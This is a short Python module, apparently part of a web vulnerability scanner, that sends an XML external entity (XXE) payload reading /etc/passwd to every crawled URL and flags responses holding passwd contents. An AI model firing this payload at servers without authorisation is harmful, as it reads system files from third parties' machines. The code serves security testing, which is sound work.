import requests

class XXEScanner:

    def __init__(self, session):
        self.session = session

        self.payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""

    def scan(self, crawl_results):

        results = []

        for url in crawl_results["visited_urls"]:

            try:
                headers = {
                    "Content-Type": "application/xml"
                }

                response = self.session.post(
                    url,
                    data=self.payload,
                    headers=headers,
                    timeout=10
                )

                if self.detect_xxe(response.text):

                    results.append({
                        "type": "XXE",
                        "url": url,
                        "severity": "High",
                        "evidence": response.text[:200]
                    })

            except Exception:
                continue

        return results

    def detect_xxe(self, response_text):

        indicators = [
            "root:x:",
            "/bin/bash",
            "/etc/passwd"
        ]

        for indicator in indicators:
            if indicator in response_text:
                return True

        return False